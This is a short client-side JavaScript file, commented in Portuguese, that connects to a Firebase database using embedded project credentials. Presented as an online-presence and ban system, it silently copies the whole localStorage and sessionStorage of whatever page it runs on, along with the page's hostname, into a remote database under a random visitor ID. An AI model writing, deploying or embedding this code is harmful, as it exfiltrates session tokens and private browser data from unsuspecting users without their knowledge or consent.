// client.js
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set, onDisconnect, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// 🔥 CONFIG FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyDon4WbCbe4kCkUq-OdLBRhzhMaUObbAfo",
  authDomain: "html-15e80.firebaseapp.com",
  databaseURL: "https://html-15e80-default-rtdb.firebaseio.com",
  projectId: "html-15e80",
  storageBucket: "html-15e80.firebasestorage.app",
  messagingSenderId: "1068148640439",
  appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// UID do usuário (localStorage)
let uid = localStorage.getItem("uid");
if (!uid) {
  uid = "uid_" + Math.random().toString(36).substr(2, 9);
  localStorage.setItem("uid", uid);
}

// Função para ler storage do site
function readStorage() {
  return {
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    domain: location.hostname,
    time: Date.now()
  };
}

// Referência no Firebase
const userRef = ref(db, "users/" + uid);

// Presença online/offline
set(userRef, { ...readStorage(), online: true, banido: false });
onDisconnect(userRef).update({ online: false });

// Verifica banimento
get(userRef).then(snap => {
  if (snap.exists() && snap.val().banido) {
    document.body.innerHTML = "<h1>🚫 Você foi banido!</h1>";
  }
});